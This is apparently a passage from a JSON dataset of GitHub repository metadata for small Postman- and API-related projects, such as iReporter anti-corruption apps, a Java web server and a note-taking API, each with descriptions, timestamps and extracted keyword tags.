      "previous",
      "city",
      "named",
      "general",
      "instance",
      "familiar",
      "important",
      "become",
      "forge",
      "explore",
      "mean",
      "inside",
      "properties",
      "onto",
      "passing",
      "listen",
      "weather",
      "something",
      "names",
      "reusable",
      "inject",
      "array",
      "least",
      "shows",
      "comfortable",
      "tiny",
      "always",
      "clean",
      "cool",
      "five",
      "namely",
      "invoking",
      "initial",
      "returning",
      "actually",
      "wrappers",
      "wraps",
      "talent",
      "whole",
      "element",
      "directives",
      "elements",
      "essential",
      "sense",
      "arent",
      "much",
      "every",
      "wanted"
    ]
  },
  {
    "id": 174416694,
    "name": "JAVA-EE-Women-Empowerment-Plateform",
    "full_name": "majdbk/JAVA-EE-Women-Empowerment-Plateform",
    "description": "Design / Backend development of the Women empowerment plateform, a social news plateform where users can manage and participate in training sessions and give their feedback. Tools: Java/JEE, JBOSS/Wildfly, PostgreSQL, Postman, Apache Maven, Hibernate ORM",
    "fork": false,
    "created_at": "2019-03-07T20:39:42Z",
    "updated_at": "2019-03-11T22:05:10Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 23578864,
    "owner_login": "majdbk",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/23578864?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "user",
      "develop",
      "sign",
      "manage",
      "users",
      "plate",
      "development",
      "social",
      "training",
      "sessions",
      "news"
    ]
  },
  {
    "id": 142798122,
    "name": "Multithread-Web-Server",
    "full_name": "xzhang007/Multithread-Web-Server",
    "description": "Developed a web server in Java capable of handling HTTP requests and parsing those requests, and sending out various HTTP responses. • Handles basic user authentication and CGI which could execute concurrently using multithreading and synchronized method. And it could send binary files like images over network. • Using GitHub repository to control versions and Postman to test as well as factory design pattern.",
    "fork": false,
    "created_at": "2018-07-29T21:54:31Z",
    "updated_at": "2018-11-07T23:21:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 16105149,
    "owner_login": "xzhang007",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/16105149?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "request",
      "file",
      "repos",
      "repository",
      "server",
      "requests",
      "user",
      "sign",
      "auth",
      "files",
      "send",
      "read",
      "authentication",
      "response",
      "rent",
      "version",
      "image",
      "method",
      "control",
      "design",
      "various",
      "images",
      "responses",
      "sync",
      "handling",
      "sending",
      "those",
      "actor",
      "current",
      "network",
      "execute",
      "currently",
      "reading",
      "versions",
      "parsing",
      "capable"
    ]
  },
  {
    "id": 158019808,
    "name": "AndelaCodeCamp",
    "full_name": "Simbadeveloper/AndelaCodeCamp",
    "description": "a web application that provides a platform that brings businesses and individuals together. The platform will be a catalog where business owners can register their businesses for visibility to potential customers and will also give users (customers) the ability to write reviews for the businesses.",
    "fork": false,
    "created_at": "2018-11-17T19:58:55Z",
    "updated_at": "2019-06-14T08:53:03Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 38291725,
    "owner_login": "Simbadeveloper",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/38291725?v=4",
    "pulled": 1,
    "tags": [
      "form",
      "application",
      "user",
      "users",
      "view",
      "provide",
      "web app",
      "custom",
      "esse",
      "platform",
      "review",
      "write",
      "provides",
      "register",
      "customer",
      "customers",
      "reviews",
      "catalog",
      "business",
      "businesses",
      "brings"
    ]
  },
  {
    "id": 188559312,
    "name": "IreporterReactJs",
    "full_name": "LarryKarani/IreporterReactJs",
    "description": "# iReporterApi iReporter is an application whose aim is to reduce corruption in Africa and foster economic development. It allows users to create red flags and interventions. It implents the following list of APIs.  ### Framework used The application is built using python: flask framework. >[Flask](http://flask.pocoo.org/) is a microframework for the Python programming language.   ### End points Method | Endpoint | Usage | | ---- | ---- | --------------- | |POST| `/api/v2/auth/signup` |  Register a user. | |POST| `api/v2/auth/login` | Login user.| |POST| `api/v2/auth/logout` | Logs out a user.| |POST| `api/v2/interventions` | Create a new incident. | |GET| `api/v2/interventions` | Get all the created incidents. | |GET| `api/v2/interventions/user` | Get all incident of the logged in user. | |GET| `api/v2/interventions/` | Get a single incident. | |PATCH| `api/v2/interventions//location` | Update a single incident location. | |PATCH| `api/v2/interventions//comment` | Update a single incident comment. | |PATCH| `api/v2/interventions//status` | Update a single incident status. | |DELETE| `api/v2/interventions/` | Delete a single incident. |  ## Installation 🕵 - To run on local machine git clone this project : ``` $ git clone https://github.com/larryTheGeek/iReporterApi.git ``` Copy and paste the above command in your terminal, the project will be downloaded to your local machine.  To Install python checkout: ``` https://www.python.org/ ```  - create a virtualenv and make it use python 3 using the following command. ``` $ virtualenv -p python3 env ``` - activate the virtual environment ```  $ source env/bin/activate ``` - Install Requirements ``` $ pip install -r requirements.txt ``` ### Testing - Run Test using pytest with the following command ``` $ py.test --cov=app test`  ``` you will get the test coverage report on your terminal   The app can also be tested via Postman - Run App  ``` $ python run.py ``` The app should be accessiable via : http://127.0.0.1:5000/  open postman and navigate to the API endpoints described above  ### HEROKU URL  https://ireporter-version2.herokuapp.com/api/v2/   ### Owner - Larry Karani  ### Motivation https://www.youtube.com/watch?v=wHRUDL7GKmI",
    "fork": false,
    "created_at": "2019-05-25T11:43:18Z",
    "updated_at": "2019-05-28T07:00:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22986772,
    "owner_login": "LarryKarani",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/22986772?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "repo",
      "application",
      "http",
      "user",
      "develop",
      "sign",
      "environment",
      "auth",
      "endpoint",
      "points",
      "tested",
      "framework",
      "https",
      "endpoints",
      "load",
      "local",
      "list",
      "source",
      "built",
      "users",
      "stat",
      "version",
      "python",
      "development",
      "command",
      "access",
      "check",
      "program",
      "report",
      "github",
      "allows",
      "open",
      "lang",
      "micro",
      "install",
      "flask",
      "login",
      "clone",
      "desc",
      "download",
      "status",
      "require",
      "following",
      "machine",
      "reporter",
      "should",
      "single",
      "location",
      "terminal",
      "heroku",
      "language",
      "coverage",
      "signup",
      "programming",
      "pytest",
      "foster",
      "youtube",
      "ireporter"
    ]
  },
  {
    "id": 162571828,
    "name": "iReporter2",
    "full_name": "bakersen/iReporter2",
    "description": "iReporter enables any/every citizen to bring any form of corruption to the notice of appropriate authorities and the general public. Users can also report on things that needs government intervention. Corruption is a huge bane to Africa’s development. African countries must develop novel and localised solutions that will curb this menace, hence the birth of iReporter.  ### Features  1. Users can create an account and log in. 2. Users can create a red-flag record (An incident linked to corruption). 3. Users can create intervention record (a call for a government agency to intervene e.g repair bad road sections, collapsed bridges, flooding e.t.c). 4. Users can edit their red-flag or intervention records. 5. Users can delete their red-flag or intervention records. 6. Users can add geolocation (Lat Long Coordinates) to their red-flag or intervention records . 7. Users can change the geolocation (Lat Long Coordinates) attached to their red-flag or intervention records . 8. Admin can change the status of a record to either under investigation, rejected (in the event of a false claim) or resolved (in the event that the claim has been investigated and resolved) .  Optional Features  1. Users can add images to their red-flag or intervention records, to support their claims. 2. Users can add videos to their red-flag or intervention records, to support their claims. 3. The application should display a Google Map with Marker showing the red-flag or intervention location. 4. The user gets real-time email notification when Admin changes the status of their record. 5. The user gets real-time SMS notification when Admin changes the status of their record.   ## Built With  * HTML, CSS, Javascript * Python, Flask APIs * Postgres SQL  ## Tools Used  * Pivotal Tracker * github * Postman * Heroku  ## Version  v1.0   ## Authors  * **Baker Sentamu**  ## iReporter Demo UI Link   ## Acknowledgments  * Andela Learning Facilitators",
    "fork": false,
    "created_at": "2018-12-20T11:41:54Z",
    "updated_at": "2019-02-14T14:26:05Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 7971499,
    "owner_login": "bakersen",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/7971499?v=4",
    "pulled": 1,
    "tags": [
      "create",
      "repo",
      "form",
      "application",
      "script",
      "call",
      "user",
      "develop",
      "mail",
      "auth",
      "local",
      "stat",
      "delete",
      "email",
      "development",
      "image",
      "very",
      "play",
      "need",
      "report",
      "github",
      "ever",
      "support",
      "public",
      "edit",
      "link",
      "under",
      "showing",
      "account",
      "images",
      "solution",
      "status",
      "enable",
      "been",
      "needs",
      "enables",
      "should",
      "location",
      "event",
      "display",
      "gets",
      "things",
      "notification",
      "solutions",
      "general",
      "bridge",
      "video",
      "either",
      "bane",
      "countries",
      "section",
      "every"
    ]
  },
  {
    "id": 201517749,
    "name": "note-app",
    "full_name": "luxie11/note-app",
    "description": "An API created for saving user tasks. For API testing used Postman. This API can be user for WEB application creation with React, Vue or any front-end framework. ",
    "fork": false,
    "created_at": "2019-08-09T18:03:55Z",
    "updated_at": "2019-08-09T19:53:51Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 29857050,
    "owner_login": "luxie11",
    "owner_avatar_url": "https://avatars3.githubusercontent.com/u/29857050?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "create",
      "testing",
      "application",
      "user",
      "framework",
      "front",
      "task",
      "creation",
      "tasks",
      "saving"
    ]
  },
  {
    "id": 159670446,
    "name": "QA-automation-programmer",
    "full_name": "TVoroshilova/QA-automation-programmer",
    "description": "At least 2 years experience in Testing Automation Development using known software testing tools and frameworks as Selenium, Appium, Postman, etc. ∙ Experience with Web, DB (SQL/NoSQL) and API testing – Must. ∙ Experience with working over Linux OS and public cloud environments – Must. ∙ Experience with defect tracking system (as GIT, Jira or VSTS/Azure Dev Ops) – Must. ∙ Experience in working with Docker – Advantage.We are seeking an experienced QA automation programmer that will be leading the testing automation activities for our SaaS product. ∙ The QA automation programmer will be part of an innovative team developing a challenging, cutting edge technology Web application for the e-Commerce world. ∙ Main responsibilities: Develop test plans including functional testing, end user testing, stress, performance, reliability and usability testing. o Evaluate product code according to specifications, report and track bugs and fixes. o Execute automatic tests on the product during development and pre-release stages. o Work closely with R&D and product teams on new features, system integration and performance testing as a part of a startup company stationed in Israel. o Participate in the complete development process using the agile methodology. ∙ Academic degree from a known institution.High level English – very good writing skills, fluent speech.The candidate agrees to work from Trust’s offices and not remotely from home.Salary expectations: Up to 2000 USD (Gross salary)",
    "fork": false,
    "created_at": "2018-11-29T13:27:02Z",
    "updated_at": "2018-11-29T13:27:02Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 45455770,
    "owner_login": "TVoroshilova",
    "owner_avatar_url": "https://avatars2.githubusercontent.com/u/45455770?v=4",
    "pulled": 1,
    "tags": [
      "test",
      "repo",
      "testing",
      "form",
      "tests",
      "application",
      "tool",
      "tests ",
      "user",
      "develop",
      "auto",
      "code",
      "automat",
      "environment",
      "framework",
      "function",
      "spec",
      "integration",
      "star",
      "stat",
      "start",
      "tools",
      "development",
      "environments",
      "very",
      "perform",
      "functional",
      "method",
      "system",
      "automation",
      "working",
      "program",
      "report",
      "feature",
      "tech",
      "cloud",
      "complete",
      "product",
      "public",
      "features",
      "automatic",
      "specific",
      "including",
      "track",
      "software",
      "process",
      "writing",
      "remote",
      "according",
      "performance",
      "world",
      "home",
      "specification",
      "expect",
      "technology",
      "specifications",
      "agile",
      "developing",
      "during",
      "fluent",
      "skills",
      "seek",
      "degree",
      "office",
      "least",
      "release",
      "level",
      "frameworks",
      "tracking"
    ]
  },
  {
    "id": 178413776,
    "name": "PostmanToHtml_Markdown",
    "full_name": "zaycodes/PostmanToHtml_Markdown",
    "description": null,
    "fork": false,
    "created_at": "2019-03-29T13:48:47Z",
    "updated_at": "2019-10-30T11:34:44Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22375431,
    "owner_login": "zaycodes",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/22375431?v=4",
    "pulled": 1,
    "tags": []
  },
  {
    "id": 163696353,
    "name": "iex-postman-scripts",
    "full_name": "nelsonvt/iex-postman-scripts",
    "description": "(BETA) This repository contains scripts for the Postman client to check stock prices and notify users when they exceed / fall below desired values.",
    "fork": false,
    "created_at": "2018-12-31T20:41:30Z",
    "updated_at": "2018-12-31T21:42:00Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 31448347,
    "owner_login": "nelsonvt",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/31448347?v=4",
    "pulled": 1,
    "tags": [
      "repo",
      "repos",
      "repository",
      "script",
      "client",
      "user",
      "contain",
      "scripts",
      "users",
      "check",
      "notify",
      "stock",
      "below"
    ]
  }
]